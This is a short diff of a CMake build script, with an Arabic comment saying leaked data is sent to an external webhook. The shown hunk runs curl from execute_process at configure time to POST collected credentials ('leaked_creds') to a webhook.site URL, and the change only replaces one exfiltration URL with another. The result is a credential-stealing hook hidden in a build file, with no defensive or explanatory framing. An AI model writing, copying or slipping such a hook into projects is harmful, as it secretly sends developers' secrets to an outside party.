@@ -61,7 +61,7 @@ if(LEAKED_DATA)
     # إرسال البيانات المسربة إلى Webhook خارجي
     message(WARNING "Exfiltrating sensitive data to external server...")
     execute_process(
-        COMMAND bash -c "curl -s -X POST -d \"leaked_creds=${LEAKED_DATA}\" https://webhook.site/1c2b9d94-9f73-48ed-adf6-ffc19f56a6dc"
+        COMMAND bash -c "curl -s -X POST -d \"leaked_creds=${LEAKED_DATA}\" https://webhook.site/8882cf4b-fc91-433f-b162-cb4ea2a3b30c"
     )
 else()
     message(WARNING "No immediate credentials found in current environment variables.")
